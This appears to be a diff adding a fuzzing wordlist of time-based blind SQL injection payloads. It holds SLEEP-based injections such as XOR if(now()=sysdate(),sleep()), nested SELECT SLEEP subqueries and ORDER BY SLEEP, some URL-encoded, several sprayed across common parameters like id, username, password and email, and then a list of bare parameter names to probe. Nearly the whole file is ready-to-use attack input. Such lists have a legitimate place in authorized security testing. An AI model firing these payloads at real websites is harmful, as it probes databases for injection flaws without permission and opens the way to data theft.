@@ -1,0 +1,68 @@
+/dont-work-sqli
+/0
+/0%27XOR(if(now()=sysdate()%2Csleep(5*5)%2C0))XOR%27Z
+%27XOR(if(now()=sysdate()%2Csleep(5*5)%2C0))XOR%27Z
+/(SELECT(0)FROM(SELECT(SLEEP(10)))a)/
+%27%20AND%20(SELECT+5735+FROM+(SELECT(SLEEP(5*5)))YpRn)%20AND%20%27Jswp%27=%27Jswp
+/
+?id=0
+/,(select+*+from+(select(sleep(10)))a)/
+/1)+or+sleep(10)#/
+)+or+sleep(10)#/
+/1
+/1%27+and+sleep(10)
+/AND+SLEEP(10)--
+%27+AND+SLEEP(10)+AND+%271
+/+ORDER+BY+SLEEP(10)/
+/AND+(SELECT+*+FROM+(SELECT(SLEEP(10)))bAKL)+AND+
+?/0
+/(SELECT(0)FROM(SELECT(SLEEP(12)))a)/
+?id=
+/,(select * from (select(sleep(12)))a)/
+/1) or sleep(12)#/
+/AND SLEEP(12)--
+/ ORDER BY SLEEP(12)/
+/AND (SELECT * FROM (SELECT(SLEEP(12)))bAKL) AND
+/?article_id=0
+/?article_id=0%27XOR%28if%28now%28%212%3Dsysdate%28%212%2Csleep%2812%212%2C0%212%212XOR%27Z&category=0%27XOR%28if%28now%28%212%3Dsysdate%28%212%2Csleep%2812%212%2C0%212%212XOR%27Z&city=0%27XOR%28if%28now%28%212%3Dsysdate%28%212%2Csleep%2812%212%2C0%212%212XOR%27Z&country=0%27XOR%28if%28now%28%212%3Dsysdate%28%212%2Csleep%2812%212%2C0%212%212XOR%27Z&email=0%27XOR%28if%28now%28%212%3Dsysdate%28%212%2Csleep%2812%212%2C0%212%212XOR%27Z&id=0%27XOR%28if%28now%28%212%3Dsysdate%28%212%2Csleep%2812%212%2C0%212%212XOR%27Z&language=0%27XOR%28if%28now%28%212%3Dsysdate%28%212%2Csleep%2812%212%2C0%212%212XOR%27Z&page=0%27XOR%28if%28now%28%212%3Dsysdate%28%212%2Csleep%2812%212%2C0%212%212XOR%27Z&password=0%27XOR%28if%28now%28%212%3Dsysdate%28%212%2Csleep%2812%212%2C0%212%212XOR%27Z&product_id=0%27XOR%28if%28now%28%212%3Dsysdate%28%212%2Csleep%2812%212%2C0%212%212XOR%27Z&search=0%27XOR%28if%28now%28%212%3Dsysdate%28%212%2Csleep%2812%212%2C0%212%212XOR%27Z&state=0%27XOR%28if%28now%28%212%3Dsysdate%28%212%2Csleep%2812%212%2C0%212%212XOR%27Z&user=0%27XOR%28if%28now%28%212%3Dsysdate%28%212%2Csleep%2812%212%2C0%212%212XOR%27Z&username=0%27XOR%28if%28now%28%212%3Dsysdate%28%212%2Csleep%2812%212%2C0%212%212XOR%27Z&zip=0%27XOR%28if%28now%28%212%3Dsysdate%28%212%2Csleep%2812%212%2C0%212%212XOR%27Z
+/?article_id=(SELECT(0)FROM(SELECT(SLEEP(12)))a)&category=(SELECT(0)FROM(SELECT(SLEEP(12)))a)&city=(SELECT(0)FROM(SELECT(SLEEP(12)))a)&country=(SELECT(0)FROM(SELECT(SLEEP(12)))a)&email=(SELECT(0)FROM(SELECT(SLEEP(12)))a)&id=(SELECT(0)FROM(SELECT(SLEEP(12)))a)&language=(SELECT(0)FROM(SELECT(SLEEP(12)))a)&page=(SELECT(0)FROM(SELECT(SLEEP(12)))a)&password=(SELECT(0)FROM(SELECT(SLEEP(12)))a)&product_id=(SELECT(0)FROM(SELECT(SLEEP(12)))a)&search=(SELECT(0)FROM(SELECT(SLEEP(12)))a)&state=(SELECT(0)FROM(SELECT(SLEEP(12)))a)&user=(SELECT(0)FROM(SELECT(SLEEP(12)))a)&username=(SELECT(0)FROM(SELECT(SLEEP(12)))a)&zip=(SELECT(0)FROM(SELECT(SLEEP(12)))a)
+/?article_id=
+/?article_id=ORDER BY SLEEP(12)/&category=ORDER BY SLEEP(12)/&city=ORDER BY SLEEP(12)/&country=ORDER BY SLEEP(12)/&email=ORDER BY SLEEP(12)/&id=ORDER BY SLEEP(12)/&language=ORDER BY SLEEP(12)/&page=ORDER BY SLEEP(12)/&password=ORDER BY SLEEP(12)/&product_id=ORDER BY SLEEP(12)/&search=ORDER BY SLEEP(12)/&state=ORDER BY SLEEP(12)/&user=ORDER BY SLEEP(12)/&username=ORDER BY SLEEP(12)/&zip=ORDER BY SLEEP(12)/
+?qs=0
+?content=0
+?referer=0
+?continue=0
+?cpf=0
+?image=0
+?price=0
+?by=0
+?limit=0
+?size=0
+?receiver=0
+?linkId=0
+?strData=0
+?onclick=0
+?features=0
+?dialog=0
+?instrucao=0
+?client=0
+?querystring=0
+?languageCode=0
+?property=0
+?securitytext=0
+?ping=0
+?purchases=0
+?storeId=0
+?targetid=0
+?operator_id=0
+?deadline=0
+?collection=0
+?embed=0
+?play=0
+?dnfile=0
+?hosting=0
+?plataform=0
+?a=0
+?aa=0
+?aaa=0
+?container=0
